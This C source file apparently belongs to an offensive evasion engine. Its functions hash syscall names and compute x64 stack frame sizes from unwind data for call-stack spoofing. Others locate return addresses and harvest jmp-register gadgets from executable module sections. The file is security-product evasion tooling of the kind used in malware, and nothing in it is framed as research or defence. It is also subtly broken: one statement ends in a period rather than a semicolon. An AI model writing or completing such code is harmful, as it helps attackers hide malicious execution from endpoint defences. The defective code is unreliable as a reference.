#include "engine.h"

#pragma optimize("", off)

DWORD64 ALIOTHSyscallHash(PBYTE str) {
    DWORD64 dwHash = 0x7734773477347734;
    INT c;
    while (c = (INT)((char)*str++)) dwHash = ((dwHash << 0x5) + dwHash) + c;
    return dwHash;
}

DWORD ALIOTHCalcFrameSize(PVOID pFunc) {
    if (!pFunc) return DEFAULT_FRAME_SIZE;
    
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    if (!hK32) return DEFAULT_FRAME_SIZE;
    
    fnRtlLookupFunctionEntry RtlLookup = (fnRtlLookupFunctionEntry)GetProcAddress(hK32, "RtlLookupFunctionEntry");
    if (!RtlLookup) return DEFAULT_FRAME_SIZE;
    
    DWORD64 ImageBase = 0;
    PRUNTIME_FUNCTION pRF = RtlLookup((DWORD64)pFunc, &ImageBase, NULL);
    if (!pRF) return DEFAULT_FRAME_SIZE;
    
    DWORD totalSize = 0;
    
    while (pRF) {
        PUNWIND_INFO pUI = (PUNWIND_INFO)(ImageBase + pRF->UnwindData);
        for (int i = 0; i < pUI->CountOfCodes; i++) {
            UNWIND_CODE* pCode = &pUI->UnwindCode[i];
            BYTE op = pCode->UnwindOp;
            BYTE info = pCode->OpInfo;
            
            if (op == 0) totalSize += 8;
            else if (op == 1) {
                if (info == 0) { totalSize += (*(USHORT*)&pUI->UnwindCode[i+1]) * 8; i += 1; }
                else { totalSize += *(DWORD*)&pUI->UnwindCode[i+1]; i += 2; }
            }
            else if (op == 2) totalSize += (info * 8) + 8;
            else if (op == 4) i += 1;
            else if (op == 5) i += 2;
            else if (op == 8) i += 1;
            else if (op == 9) i += 2;
            else if (op == 10) totalSize += (info == 0) ? 40 : 48;
        }
        
        if (pUI->Flags & 0x04) {
            int chainedOffset = (pUI->CountOfCodes + 1) & ~1;
            pRF = (PRUNTIME_FUNCTION)(&pUI->UnwindCode[chainedOffset]);
        } else break;
    }
    
    if (totalSize % 16 != 0) totalSize = (totalSize + 16) & ~15;
    return totalSize;
}

PVOID ALIOTHSeekReturnAddress(PVOID pBase) {
    if (!pBase) return NULL;

    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    if (!hK32) return pBase;
    
    fnRtlLookupFunctionEntry RtlLookup = (fnRtlLookupFunctionEntry)GetProcAddress(hK32, "RtlLookupFunctionEntry");
    if (!RtlLookup) return pBase;

    DWORD scanLimit = 256;
    DWORD64 ImageBase = 0;
    PRUNTIME_FUNCTION pRF = RtlLookup((DWORD64)pBase, &ImageBase, NULL);
    
    if (pRF) {
        PVOID realBegin = (PVOID)(ImageBase + pRF->BeginAddress);
        PVOID realEnd = (PVOID)(ImageBase + pRF->EndAddress);
        DWORD remaining = (DWORD)((PBYTE)realEnd - (PBYTE)pBase);
        scanLimit = (remaining < 256) ? remaining : 256;
    }

    PBYTE pBytes = (PBYTE)pBase;
    for (DWORD i = 0; i < scanLimit; i++) {
        if (i + 6 <= scanLimit && pBytes[i] == 0xFF && pBytes[i+1] == 0x15)
            return (PVOID)(pBytes + i + 6);
        if (i + 5 <= scanLimit && pBytes[i] == 0xE8)
            return (PVOID)(pBytes + i + 5);
    }
    return pBase;
}

DWORD ALIOTHFindValidGadgets(PCHAR pcModuleName, ALIOTH_GADGET_ENTRY pOutGadgets[], DWORD dwMaxGadgets) {
    HMODULE hModule = GetModuleHandleA(pcModuleName);
    if (!hModule) return 0;
    
    PBYTE pBase = (PBYTE)hModule;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)((PBYTE)&pNt->OptionalHeader + pNt->FileHeader.SizeOfOptionalHeader);
    
    DWORD dwFound = 0;
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections && dwFound < dwMaxGadgets; i++) {
        if (!(pSection[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        
        PBYTE pSectionBase = pBase + pSection[i].VirtualAddress;
        DWORD dwSectionSize = pSection[i].SizeOfRawData.
        
        for (DWORD j = 0; j < dwSectionSize - 2 && dwFound < dwMaxGadgets; j++) {
            if (pSectionBase[j] == 0xFF && pSectionBase[j+1] == 0xE0) {
                pOutGadgets[dwFound].pGadgetAddress = (PVOID)(pSectionBase + j);
                pOutGadgets[dwFound].dwGadgetType = 0;
                pOutGadgets[dwFound].dwFrameSize = 0;
                pOutGadgets[dwFound].dwModuleBase = (DWORD64)hModule;
                dwFound++;
            }
            else if (pSectionBase[j] == 0xFF && pSectionBase[j+1] == 0xE7) {
                pOutGadgets[dwFound].pGadgetAddress = (PVOID)(pSectionBase + j);
                pOutGadgets[dwFound].dwGadgetType = 1;
                pOutGadgets[dwFound].dwFrameSize = 0;
                pOutGadgets[dwFound].dwModuleBase = (DWORD64)hModule;
                dwFound++;
            }
            else if (pSectionBase[j] == 0xFF && pSectionBase[j+1] == 0xE6) {
                pOutGadgets[dwFound].pGadgetAddress = (PVOID)(pSectionBase + j);
                pOutGadgets[dwFound].dwGadgetType = 2;
                pOutGadgets[dwFound].dwFrameSize = 0;
                pOutGadgets[dwFound].dwModuleBase = (DWORD64)hModule;
                dwFound++;
            }
            else if (pSectionBase[j] == 0xFF && pSectionBase[j+1] == 0xE3) {
                pOutGadgets[dwFound].pGadgetAddress = (PVOID)(pSectionBase + j);
                pOutGadgets[dwFound].dwGadgetType = 3;
                pOutGadgets[dwFound].dwFrameSize = 0;
                pOutGadgets[dwFound].dwModuleBase = (DWORD64)hModule;
                dwFound++;
            }
            else if (pSectionBase[j] == 0x41 && pSectionBase[j+1] == 0xFF && j+2 < dwSectionSize) {
                if (pSectionBase[j+2] == 0xE4) {
                    pOutGadgets[dwFound].pGadgetAddress = (PVOID)(pSectionBase + j);
                    pOutGadgets[dwFound].dwGadgetType = 4;
                    pOutGadgets[dwFound].dwFrameSize = 0;
                    pOutGadgets[dwFound].dwModuleBase = (DWORD64)hModule;
                    dwFound++;
                }
                else if (pSectionBase[j+2] == 0xE5) {
                    pOutGadgets[dwFound].pGadgetAddress = (PVOID)(pSectionBase + j);
                    pOutGadgets[dwFound].dwGadgetType = 5;
                    pOutGadgets[dwFound].dwFrameSize = 0;
                    pOutGadgets[dwFound].dwModuleBase = (DWORD64)hModule;
                    dwFound++;
                }
                else if (pSectionBase[j+2] == 0xE6) {
                    pOutGadgets[dwFound].pGadgetAddress = (PVOID)(pSectionBase + j);
                    pOutGadgets[dwFound].dwGadgetType = 6;
                    pOutGadgets[dwFound].dwFrameSize = 0;
                    pOutGadgets[dwFound].dwModuleBase = (DWORD64)hModule;
                    dwFound++;
                }
                else if (pSectionBase[j+2] == 0xE7) {
                    pOutGadgets[dwFound].pGadgetAddress = (PVOID)(pSectionBase + j);
                    pOutGadgets[dwFound].dwGadgetType = 7;
                    pOutGadgets[dwFound].dwFrameSize = 0;
                    pOutGadgets[dwFound].dwModuleBase = (DWORD64)hModule;
                    dwFound++;
                }
            }
        }
    }
    return dwFound;
}
#pragma optimize("", on)
